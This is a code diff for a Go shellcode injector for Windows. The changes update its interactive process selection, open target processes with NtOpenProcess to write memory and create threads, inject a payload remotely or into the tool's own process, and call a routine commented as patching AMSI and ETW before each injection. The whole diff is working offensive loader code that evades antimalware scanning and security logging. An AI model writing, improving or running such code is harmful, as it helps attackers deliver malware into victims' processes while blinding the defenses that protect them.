@@ -512,11 +512,20 @@ func main() {
 		
 		// Prompt user to select a process
 		var selectedIndex int
+		var processHandle uintptr
+		var status uintptr
+		
 		for {
-			fmt.Printf("\nEnter process number to inject into: ")
+			fmt.Printf("\nEnter process number to inject into (or 'q' to quit): ")
 			scanner := bufio.NewScanner(os.Stdin)
 			if scanner.Scan() {
 				input := strings.TrimSpace(scanner.Text())
+				
+				// Check for quit command
+				if input == "q" || input == "Q" {
+					fmt.Println("Operation cancelled by user")
+					return
+				}
 				
 				// Parse the input
 				index, err := strconv.Atoi(input)
@@ -526,7 +535,45 @@ func main() {
 				}
 				
 				selectedIndex = index - 1
-				break
+				selectedProcess = processes[selectedIndex]
+				
+				// Try to open the process to verify access
+				clientId := winapi.CLIENT_ID{
+					UniqueProcess: uintptr(selectedProcess.Pid),
+					UniqueThread:  0,
+				}
+				
+				objAttrs := winapi.OBJECT_ATTRIBUTES{
+					Length: uint32(unsafe.Sizeof(winapi.OBJECT_ATTRIBUTES{})),
+				}
+				
+				desiredAccess := uintptr(winapi.PROCESS_CREATE_THREAD | winapi.PROCESS_VM_OPERATION | winapi.PROCESS_VM_WRITE | winapi.PROCESS_VM_READ | winapi.PROCESS_QUERY_INFORMATION)
+				
+				status, err = winapi.NtOpenProcess(
+					&processHandle,
+					desiredAccess,
+					uintptr(unsafe.Pointer(&objAttrs)),
+					uintptr(unsafe.Pointer(&clientId)),
+				)
+				
+				if status == winapi.STATUS_SUCCESS {
+					break // Successfully opened process, proceed with injection
+				}
+				
+				// Handle access denied or other errors
+				if status == winapi.STATUS_ACCESS_DENIED {
+					fmt.Printf("\nAccess denied to process %s (PID: %d). Please select a different process.\n", selectedProcess.Name, selectedProcess.Pid)
+				} else {
+					fmt.Printf("\nFailed to open process %s (PID: %d): %s\n", selectedProcess.Name, selectedProcess.Pid, winapi.FormatNTStatus(status))
+				}
+				
+				// Re-display the process list for convenience
+				fmt.Printf("\nAvailable processes:\n")
+				fmt.Printf("-------------------\n")
+				for i, proc := range processes {
+					fmt.Printf("[%d] PID: %d - %s\n", i+1, proc.Pid, proc.Name)
+				}
+				continue
 			}
 			
 			if err := scanner.Err(); err != nil {
@@ -535,71 +582,38 @@ func main() {
 			}
 		}
 		
-		// Get the selected process
-		selectedProcess = processes[selectedIndex]
+		// Successfully selected and opened process
 		fmt.Printf("\nSelected: [%d] %s (PID: %d)\n", selectedIndex+1, selectedProcess.Name, selectedProcess.Pid)
-	}
-
-	
-	// Perform the injection based on selected method
-	if useSelfInjection {
-		// Self-injection
-		debug.Printfln("MAIN", "Injecting payload into current process (self-injection)\n")
-		err = winapi.NtInjectSelfShellcode(payload)
-		
-		if err != nil {
-			debug.Printfln("MAIN", "Self-injection failed: %v\n", err)
-		} else {
-			debug.Printfln("MAIN", "Self-injection Successful\n")
-		}
-	} else {
-		// Remote injection - first need to open the process
-		fmt.Printf("Injecting payload into %s (PID: %d)\n", selectedProcess.Name, selectedProcess.Pid)
-		fmt.Printf("Payload size: %d bytes\n", len(payload))
-		
-		// Open target process
-		var processHandle uintptr
-		clientId := winapi.CLIENT_ID{
-			UniqueProcess: uintptr(selectedProcess.Pid),
-			UniqueThread:  0,
-		}
-		
-		// Initialize OBJECT_ATTRIBUTES properly
-		objAttrs := winapi.OBJECT_ATTRIBUTES{
-			Length: uint32(unsafe.Sizeof(winapi.OBJECT_ATTRIBUTES{})),
-		}
-		
-		// Use specific access rights like the working example
-		// PROCESS_CREATE_THREAD | PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_VM_READ | PROCESS_QUERY_INFORMATION
-		desiredAccess := uintptr(winapi.PROCESS_CREATE_THREAD | winapi.PROCESS_VM_OPERATION | winapi.PROCESS_VM_WRITE | winapi.PROCESS_VM_READ | winapi.PROCESS_QUERY_INFORMATION)
-		
-		status, err := winapi.NtOpenProcess(
-			&processHandle,
-			desiredAccess,
-			uintptr(unsafe.Pointer(&objAttrs)),
-			uintptr(unsafe.Pointer(&clientId)),
-		)
-		
-		if err != nil {
-			fmt.Printf("Failed to open target process: %v\n", err)
-			return
-		}
-		
-		if status != winapi.STATUS_SUCCESS {
-			fmt.Printf("Failed to open target process: %s\n", winapi.FormatNTStatus(status))
-			return
-		}
 		
 		// Ensure we close the process handle when done
 		defer winapi.NtClose(processHandle)
 		
-		// Use our new library function for remote injection
+		// Remote injection - first need to open the process
+		fmt.Printf("Injecting payload into %s (PID: %d)\n", selectedProcess.Name, selectedProcess.Pid)
+		fmt.Printf("Payload size: %d bytes\n", len(payload))
+		
+		// Call remote injection func and patch amsi/etw 
+		winapi.ApplyCriticalPatches()
 		err = winapi.NtInjectRemote(processHandle, payload)
 		
 		if err != nil {
 			fmt.Printf("Remote injection failed: %v\n", err)
 		} else {
 			fmt.Printf("Remote injection Successful\n")
+		}
+	}
+
+	// Perform the injection based on selected method
+	if useSelfInjection {
+		// Self-injection
+		debug.Printfln("MAIN", "Injecting payload into current process (self-injection)\n")
+		winapi.ApplyCriticalPatches()
+		err = winapi.NtInjectSelfShellcode(payload)
+		
+		if err != nil {
+			debug.Printfln("MAIN", "Self-injection failed: %v\n", err)
+		} else {
+			debug.Printfln("MAIN", "Self-injection Successful\n")
 		}
 	}
 }
